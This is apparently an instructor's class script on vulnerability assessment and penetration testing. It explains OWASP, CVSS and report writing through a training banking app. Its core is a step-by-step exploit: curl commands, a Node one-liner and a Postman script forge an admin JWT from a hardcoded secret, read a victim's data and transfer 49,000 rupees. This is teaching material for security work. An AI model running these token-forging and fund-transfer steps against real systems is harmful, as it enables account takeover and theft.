What Is VAPT? (4 min)
VAPT stands for Vulnerability Assessment and Penetration Testing. Two words, two activities.
A Vulnerability Assessment is breadth. You walk around the application and identify weaknesses — "this header is missing," "this password policy is weak," "this endpoint reveals too much information." It's largely tool-assisted. You run Nuclei, Nessus, OpenVAS, Burp Suite scanner, and you get a list.
A Penetration Test is depth. You take those weaknesses and you actually try to break in. You chain them together. You prove impact. "I didn't just find a hardcoded secret — I forged a token with it and transferred forty-nine thousand rupees out of a victim's account." That's a pentest finding.
Together: VAPT.
In the industry, most engagements are a mix — you scan broadly to find candidate weaknesses, then you exploit selectively to prove the high-impact ones. That's exactly what we'll do on ScalerBank today.
Why the Report Matters More Than the Hacking
Here's something most beginners miss.
Hacking is forty percent of the job. The report is sixty percent.
Why? Because your client is paying for the report. Let me introduce two characters who will follow us through both classes.
Jack — the founder of ScalerBank. He's a business owner, not a technologist. He cares about three things: how bad is this, what could happen to my business, and what do I fix first.
Bob — a security consultant from a VAPT firm. Jack has hired Bob's team to test ScalerBank before the official launch.
Bob spends a week. He finds eighteen vulnerabilities. Now here's the moment that decides whether Bob's firm gets the renewal contract: it's not the hacking. It's the document that lands in Jack's inbox on Monday morning.
If that document is jargon-filled, screenshots are blurry, severities are inflated, and recommendations are vague — Jack ignores it. The bugs don't get fixed. Bob never gets called back.
If that document opens with a one-paragraph executive summary Jack can read in his car on the way to a board meeting, then has crystal-clear findings each with proof, business impact, and a one-line fix the developer can paste into a Jira ticket — that's a report that gets things done. And that's the kind of report you're going to learn to write.
The same logic applies to bug-bounty submissions. The hunter who writes the cleanest, clearest report gets the bigger bounty — even if two other hunters submitted the same bug first.
The VAPT Engagement Lifecycle 
Let me walk you through how a real engagement runs, end to end.
Scoping — Jack and Bob agree on what's in scope. ScalerBank web app, the API, maybe the mobile app. Out of scope: the corporate office network, the third-party payment gateway, anything Jack doesn't own.
Rules of Engagement — Hours of testing, allowed payloads, escalation contacts, anti-DoS clauses. This is the legal protection for both sides.
Reconnaissance — Bob's team maps the application. Endpoints, technologies, parameters, authentication flows. This is what you'll do in Task 1 of your ScalerBank lab.
Vulnerability Assessment — Automated scanning. Burp, Nuclei, ZAP. Identify candidate issues.
Penetration Testing — Manual exploitation. Confirm each issue. Chain them together where possible.
Reporting — Draft the document. Each finding gets reviewed internally before it ships.
Walkthrough Call — Bob's team walks Jack's developers through the findings live.
Remediation Window — Jack's team fixes the issues.
Retest — Bob's team confirms fixes. Closed findings get marked closed.
Final Report — The closed-out version goes to Jack and to any external auditor.
The whole cycle, on a small app, takes about three to four weeks. Today we're compressing the parts that matter for your learning into two hours.
How VAPT Connects to GRC
This is the bridge to the next class, so listen carefully.
When Bob finds eighteen vulnerabilities in ScalerBank, those eighteen findings don't just sit in a PDF. They get fed into the company's risk register. Each finding becomes one or more risks. Each risk gets an owner, a deadline, and a treatment plan. Each treatment plan gets mapped to an ISO 27001 Annex A control.
So V-01, the hardcoded JWT secret we're about to exploit today — in Class 2 it becomes risk R-001 in ScalerBank's risk register, mapped to ISO controls A.5.17 (Authentication Information), A.8.5 (Secure Authentication), and A.8.24 (Use of Cryptography), with the AppSec Lead as the owner and a fixed deadline.
That's the loop. VAPT is the eyes. GRC is the brain that decides what to do with what the eyes saw.
🎤 Quick Question: "If a pentester finds the same SQL injection bug in twenty different companies, why is the impact of that bug different in each report?"
Exactly. The bug is the same. The impact is what your client cares about. A SQL injection on a public marketing page is annoying. The same SQL injection on a banking application is a regulatory incident. That's why every finding in a good report has a business impact paragraph — not just a CVSS score.
OWASP Top 10 — The Vocabulary of Web Security
Before we talk about findings, you need to know the vocabulary. OWASP — the Open Web Application Security Project — publishes a list of the ten most common and dangerous web vulnerabilities. Every security professional knows it by heart. So will you, by the end of this programme.
Let me give you the short version, with quick examples from ScalerBank where they apply.
A01 — Broken Access Control. Users accessing data they shouldn't. On ScalerBank, this would be IDOR — trying to read someone else's account by changing a UUID. We tested it — ScalerBank actually got this one right; the API returns 404. We'll mention this as a positive control in the report.
A02 — Cryptographic Failures. Bad use of crypto, missing encryption, hardcoded keys. This is V-01 on ScalerBank — the hardcoded JWT secret we'll exploit in Part 5.
A03 — Injection. SQL injection, command injection, NoSQL injection. ScalerBank has a latent SQL interpolation pattern (V-17) — not exploitable today, but a future foot-gun.
A04 — Insecure Design. Bigger picture flaws — no transfer limits, no MFA enforcement, no rate limiting. ScalerBank has all three (V-06, V-11, V-12).
A05 — Security Misconfiguration. Wide-open CORS, missing security headers, debug mode in production. ScalerBank's CORS is set to * (V-02). Helmet is not installed (V-14).
A06 — Vulnerable and Outdated Components. Old library versions with known CVEs. You'd find these by running npm audit.
A07 — Identification and Authentication Failures. Weak passwords, broken session handling, no rate limit on login. ScalerBank fails here too — V-06, V-10, V-11.
A08 — Software and Data Integrity Failures. Trusting unsigned updates, unsigned tokens, insecure deserialization.
A09 — Security Logging and Monitoring Failures. No audit logs, no IP capture, no SIEM forwarding. ScalerBank's audit logs are sparse (V-16).
A10 — Server-Side Request Forgery (SSRF). The server makes a request on the attacker's behalf to an internal resource.
Notice something? Just from this one application, we hit seven of the ten OWASP categories. That's why this list matters — it gives you the buckets to file your findings under.
CVSS — How We Rate Severity
When Bob writes a finding, he can't just say "this is bad." He needs a defensible, mathematical score. That's CVSS — Common Vulnerability Scoring System. Score from 0.0 to 10.0.
[Board: draw the scale]
Score
Severity
What It Means
9.0 – 10.0
Critical
Fix now. Drop everything.
7.0 – 8.9
High
Fix in days.
4.0 – 6.9
Medium
Fix in the next sprint.
0.1 – 3.9
Low
Fix when convenient, don't ignore.

The score is built from a vector string that captures the attack surface. For V-01 on ScalerBank, the vector is:
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N

Decoded:
AV:N — Attack Vector: Network. Exploitable over the internet.
AC:L — Attack Complexity: Low. No special conditions needed.
PR:N — Privileges Required: None. Attacker doesn't need an account.
UI:N — User Interaction: None. No phishing needed.
S:U — Scope: Unchanged.
C:H / I:H / A:N — High Confidentiality and Integrity impact, no Availability impact.
That math gives 9.1 — Critical for the base score. We rate it High in the report because the role escalation path (V-04) isn't activated today, but the base CVSS is already 9.1. You always justify your number with the vector. Never just write "High" and walk away.
Tip: Use the official FIRST.org CVSS calculator — https://www.first.org/cvss/calculator/3.1 — and screenshot the result for your evidence appendix.
Evidence — The Thing That Makes Findings Stick
A finding without evidence is just an opinion. A finding with evidence is something the developer has to fix.
For every finding you submit — VAPT or bug-bounty — you must have:
Request and response captures. Either curl outputs, or Burp Suite request/response pairs, or Postman collection snippets. Show the exact bytes.
Reproduction steps. Numbered. Anyone with a clean account should be able to follow them and reproduce.
Screenshots with annotations. Highlight the interesting field. Don't just dump a screenshot — circle what matters.
PII redacted. If you captured real user data in test traffic, blur names, emails, account numbers. Both professional and legally necessary.
A clear PoC payload. The exact token, the exact curl command, the exact body — copy-pasteable. The developer should be able to paste it into their terminal and reproduce in fifteen seconds.
If a developer can't reproduce your bug in fifteen seconds, the bug doesn't get fixed. That's the rule.
Anatomy of a Good VAPT / Bug-Bounty Report 
Report Structure — Section by Section
Let me walk you through the structure I want you to use for the ScalerBank project. This same structure works for bug bounties — just trim sections you don't need.
[Board: write each section as you describe it]
1. Cover Page
Client name, report title, version (v1.0), date range of testing, consultant firm name, classification ("CONFIDENTIAL"). It's just the first impression — but a board member might open it. Make it look professional.
2. Scope
What you tested. What you did not test. Testing window. Type (black-box / grey-box / white-box). Authenticated or unauthenticated.
For ScalerBank our scope is:
In scope: https://devops-scalerbank.onrender.com, all /api/* endpoints, the React frontend
Out of scope: Third-party services, the hosting platform (Render), denial-of-service attacks
Type: Grey-box (we have a test account; we don't have direct DB access)
Window: 21–29 April 2026
3. Executive Summary
One page. No jargon. This is the page Jack reads.
"We tested the ScalerBank digital banking application between 21st and 29th April 2026. We identified 18 vulnerabilities — 6 High, 8 Medium, 3 Low, 1 Informational. Two High findings — a hardcoded authentication key and absent money-transfer limits — are independently exploitable to achieve full account takeover and large-scale unauthorized fund movement respectively. We recommend immediate remediation of all High findings before the production launch."
That's it. Three sentences.  Jack now knows everything he needs to make a decision.
4. Methodology
Frameworks you followed — OWASP Testing Guide, OWASP ASVS, NIST SP 800-115, PTES. Tools you used — Burp Suite, curl, Postman, Nuclei, Node.js for token forging. Helps the auditor calibrate your work.
5. Findings Summary Table
A grid: ID, Title, Severity, Affected Asset, Status (Open/Closed). The developer scans this first to prioritise.
6. Detailed Findings
One section per vulnerability. We'll cover the template in detail next.
7. Risk Heatmap
A 5×5 grid — likelihood × impact — that visualises where the bulk of risk sits. Nice for executives.
8. Recommendations Summary
A prioritised list of the top fixes. Helps engineering plan the sprint.
9. Appendices
Tool output dumps (Burp logs, Nuclei JSON).
Full curl command set.
Postman collection export.
CVSS calculator screenshots.

A few rules I want you to internalise:
Title is short and descriptive. "Hardcoded fallback JWT secret" — not "JWT problem."
Description is two to four sentences. Plain English, no jargon dump.
Steps to reproduce are numbered and self-contained. Anyone can follow them with a fresh account.
Business impact is in money/regulatory/reputational terms. "Direct customer fund loss" beats "could affect users."
Remediation is specific. Not "improve security." Write the actual code change.

Set the Stage
Alright, this is the main event of today's class. We're going to do an end-to-end exploit of one vulnerability on ScalerBank — V-01, Hardcoded JWT Secret — using two different tools so you see both workflows.
First pass — curl. Old-school, scriptable, the language of every Linux command line.
Second pass — Postman. GUI, beginner-friendly, the tool most enterprise API teams use.
The vulnerability is in backend/middleware/auth.js. The JWT library uses this line:
const JWT_SECRET = process.env.JWT_SECRET || 'scalerbank_secret_key_2026';

If the environment variable isn't set — and in the repo default, it isn't — the application falls back to the literal string scalerbank_secret_key_2026. That means anyone who reads the source code (which is public, since the repo is shipped to students) can forge a JWT for any user. Including the role of admin.
This is a Critical-class vulnerability. CVSS 9.1. We're going to prove it.
🎤 Quick check: "Before we start — what's the business impact of being able to forge any user's JWT on a banking app? Shout it out." [Expected answers: account takeover, money theft, PII exposure, regulatory breach. All correct.]
Step 0 — Environment Setup
Open your terminal. We're going to set one variable so we don't have to retype the base URL every time.
export BASE=https://devops-scalerbank.onrender.com
# Or for the local lab:
# export BASE=http://localhost:3001

Verify the API is alive:
curl -s "$BASE/api/health" | jq .

You should see something like {"status":"ok"}. If you do — good, we're in.
Step 1 — Create a Victim Account (curl)
We need a victim. In a real engagement you wouldn't attack random users — you'd create your own test accounts. Bob always creates two: a victim, and an attacker.
Register the victim:
curl -s -X POST "$BASE/api/auth/register" \
  -H 'Content-Type: application/json' \
  -d '{
    "email": "victim@scaler.test",
    "password": "Hunter2hunter2",
    "firstName": "Vicky",
    "lastName": "Tim",
    "phone": "9999999999"
  }' | tee /tmp/victim.json

Save the token and user ID:
export VTOKEN=$(jq -r .token /tmp/victim.json)
export VUID=$(jq -r .user.id /tmp/victim.json)

echo "Victim token: $VTOKEN"
echo "Victim UUID:  $VUID"

Now register the attacker (Mallory — the classic attacker name in security textbooks):
curl -s -X POST "$BASE/api/auth/register" \
  -H 'Content-Type: application/json' \
  -d '{
    "email": "mallory@scaler.test",
    "password": "AttackerPass123!",
    "firstName": "Mal",
    "lastName": "Lory"
  }' | tee /tmp/mal.json

export ATOKEN=$(jq -r .token /tmp/mal.json)
export AUID=$(jq -r .user.id /tmp/mal.json)

Two accounts. Two tokens. Now let's look inside one of them.
Step 2 — Decode the JWT (3 min)
A JWT has three parts separated by dots: header, payload, signature.
echo "$VTOKEN" | awk -F. '{print $1}' | base64 -d
# {"alg":"HS256","typ":"JWT"}

echo "$VTOKEN" | awk -F. '{print $2}' | base64 -d
# {"id":"<uuid>","email":"victim@scaler.test","role":"customer","iat":...,"exp":...}

Two things to notice:
The algorithm is HS256 — HMAC with SHA-256. That means there's a single shared secret used both to sign and verify. If we know that secret, we can sign our own tokens.
The payload includes a role claim that says customer. If we forge a token with role: 'admin', the server will trust it — there's no second check.
That's the vulnerability in two observations. Now let's exploit it.
Step 3 — Forge a Token (curl + Node) (5 min)
We're going to use Node.js with the jsonwebtoken library — the same library ScalerBank itself uses. Same library, same algorithm, same secret. The forged token is mathematically indistinguishable from a real one.
FORGED=$(node -e "console.log(require('jsonwebtoken').sign({
  id:    '$VUID',
  email: 'victim@scaler.test',
  role:  'admin'
}, 'scalerbank_secret_key_2026', { expiresIn: '7d' }))")

echo "Forged token:"
echo "$FORGED"

We just signed a token that says: "I am the victim. My role is admin. I am valid for seven days." And we never typed the victim's password.
Pause and absorb this for a moment. We have not bypassed any security check. We have not exploited a memory bug. We have not phished anyone. We read one string from the source code, called one library function, and now we are the victim.
Step 4 — Use the Forged Token (curl) (4 min)
Let's prove the server accepts our forgery.
Read the victim's profile:
curl -s -H "Authorization: Bearer $FORGED" "$BASE/api/auth/profile" | jq .

You should see Vicky Tim's full profile — name, email, phone, KYC fields if set. The server has handed us the victim's data because the signature checks out.
List the victim's accounts:
curl -s -H "Authorization: Bearer $FORGED" "$BASE/api/accounts" | jq '.[] | {id, account_number, currency, balance}'

You'll see the victim's INR savings account, balance, account number. Everything an attacker needs to plan a fraudulent transfer.
Step 5 — Drain the Victim's Account (curl) (5 min)
This is the moment of impact. We're going to move money from Vicky's account into Mallory's. In a real engagement, this is what convinces the CFO that the vulnerability is real.
Get the source (victim's INR account ID) and destination (attacker's INR account number):
VFROM=$(curl -s -H "Authorization: Bearer $FORGED" "$BASE/api/accounts" \
  | jq -r '.[] | select(.currency=="INR") | .id')

ATO=$(curl -s -H "Authorization: Bearer $ATOKEN" "$BASE/api/accounts" \
  | jq -r '.[] | select(.currency=="INR") | .account_number')

echo "From account ID:    $VFROM"
echo "To account number:  $ATO"

Now execute the transfer:
curl -s -X POST "$BASE/api/transactions/transfer" \
  -H "Authorization: Bearer $FORGED" \
  -H 'Content-Type: application/json' \
  -d "{
    \"fromAccountId\":   \"$VFROM\",
    \"toAccountNumber\": \"$ATO\",
    \"amount\":          49000,
    \"description\":     \"refund\"
  }" | jq .

Expected response:
{ "transactionId": "...", "status": "completed", "balance": <small remainder> }

INR 49,000 just moved from Vicky to Mallory. The transaction is logged under Vicky's user ID because that's what the forged token claims. To the audit log, this looks like a legitimate transfer that Vicky initiated.
That is the full impact. We're done with the curl portion. Now let's redo this in Postman so you have both tools in your belt.

Request 3 — Forge the Token (Pre-request Script) (4 min)
This is the cool part. Postman has a Pre-request Script tab where you can run JavaScript before the request fires. We'll use that to forge the JWT inline.
Postman bundles CryptoJS natively. We'll write a small HMAC-SHA256 JWT signer by hand. Create a new request:
Method: GET
URL: {{BASE}}/api/auth/profile
Headers: Authorization: Bearer {{FORGED}}
In the Pre-request Script tab:
// Minimal HS256 JWT forger using CryptoJS (bundled in Postman)
const CryptoJS = require('crypto-js');

const base64url = (str) =>
  CryptoJS.enc.Utf8.parse(str)
    .toString(CryptoJS.enc.Base64)
    .replace(/=+$/, '')
    .replace(/\+/g, '-')
    .replace(/\//g, '_');

const base64urlFromWordArray = (wa) =>
  wa.toString(CryptoJS.enc.Base64)
    .replace(/=+$/, '')
    .replace(/\+/g, '-')
    .replace(/\//g, '_');

const header = { alg: "HS256", typ: "JWT" };

const now = Math.floor(Date.now() / 1000);
const payload = {
  id:    pm.environment.get("VUID"),
  email: "victim2@scaler.test",
  role:  "admin",
  iat:   now,
  exp:   now + 7 * 24 * 3600
};

const SECRET = "scalerbank_secret_key_2026";

const encHeader  = base64url(JSON.stringify(header));
const encPayload = base64url(JSON.stringify(payload));

const signature  = CryptoJS.HmacSHA256(`${encHeader}.${encPayload}`, SECRET);
const encSig     = base64urlFromWordArray(signature);

const token = `${encHeader}.${encPayload}.${encSig}`;
pm.environment.set("FORGED", token);

console.log("Forged token:", token);

Click Send. The pre-request script runs first, forges the token, stores it in FORGED, and then the actual GET request uses that token. The response should be Vicky's profile.

Step 7 — Wrap This Into a Finding
Open your VAPT report template and start filling in V-01:
ID:               SB-VAPT-001
Title:            Hardcoded fallback JWT signing secret
Severity:         High (CVSSv3.1: 9.1 — AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)
OWASP Top 10:     A02 Cryptographic Failures, A07 Identification & Authentication Failures
CWE:              CWE-798 Use of Hard-coded Credentials, CWE-321 Use of Hard-coded Cryptographic Key
Affected:         backend/middleware/auth.js:2 — all JWT-protected endpoints

Description:
The JWT signing key falls back to the literal string 'scalerbank_secret_key_2026'
when the JWT_SECRET environment variable is unset, which is the deployment default.
HMAC-SHA256 with a known key allows any third party to forge access tokens with
arbitrary id, email, and role claims. Combined with the absence of server-side role
re-validation (V-04), forged role: 'admin' tokens would yield full administrative
access on any future admin route.

Steps to Reproduce:
1. Register a victim account via POST /api/auth/register; record user.id.
2. Forge a token: node -e "console.log(require('jsonwebtoken').sign({
     id:'<victim-uuid>', email:'victim@scaler.test', role:'admin'
   }, 'scalerbank_secret_key_2026', { expiresIn:'7d' }))"

Remediation:
1. Rotate the signing secret immediately. Generate 32+ bytes of entropy and store
   in a secrets manager (AWS Secrets Manager, HashiCorp Vault). Remove the fallback literal.
2. Fail closed on absence: throw at boot if JWT_SECRET is unset or shorter than 32 chars.
3. Pin algorithm, issuer, and audience on jwt.verify().
4. Migrate to RS256 / EdDSA — asymmetric signing — so verifying services never hold the signing key.
5. Add a SAST rule (Semgrep, gitleaks) that fails CI if the pattern
   `process.env.\w+\s*\|\|\s*['"]` appears in source.

Common Mistakes I'll Be Marking Down

AI-generated descriptions. I can spot them. They're generic, don't match the specific asset, and recommend textbook fixes that don't apply. Write your own.
No reproduction steps. If the developer can't reproduce it, the bug doesn't get fixed.
Forgetting positive controls. Stronger reports also note what's correct — like the fact that ScalerBank's IDOR protection on /api/accounts/:id actually works. That signals methodical testing.
